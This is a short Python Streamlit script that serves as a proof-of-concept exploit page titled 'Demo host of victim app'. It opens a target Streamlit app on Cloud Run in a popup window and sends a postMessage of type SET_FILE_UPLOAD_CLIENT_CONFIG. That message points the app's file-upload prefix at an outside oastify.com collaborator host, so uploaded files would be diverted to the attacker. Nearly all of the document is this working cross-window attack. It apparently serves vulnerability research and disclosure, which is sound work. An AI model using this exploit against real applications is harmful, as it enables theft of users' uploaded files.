import streamlit as st
import streamlit.components.v1 as components

st.title("Demo host of victim app")
components.html("""
  <button onclick="exploit()">Exploit !</button>
  <!-- <iframe id="frame" src="https://activate-fwwrn5gbiq-ey.a.run.app/" onload="test()" width="100%" height="100%"></iframe> -->

  <script>
  function test() {
    console.log('iframe loaded');
  }

  function exploit() {
    const w = window.open('https://activate-fwwrn5gbiq-ey.a.run.app', 'poc-streamlit');
    if (!w) {
      alert('Popup blocked. Please allow popups for this site and try again.');
      return;
    }
    // const iframe = document.getElementsByTagName('iframe')[0];
    setTimeout(() => {
      confirm('Sending message ?')
      w.postMessage({
        stCommVersion: 1,
        type: "SET_FILE_UPLOAD_CLIENT_CONFIG", 
        prefix: "https://jdwhu82csdic1derbpee9ax8oe429ay.oastify.com",
        headers: {"abc": "def"}
      }, 'https://activate-fwwrn5gbiq-ey.a.run.app');
    }, 2000);
  }
  </script>
""", height=840)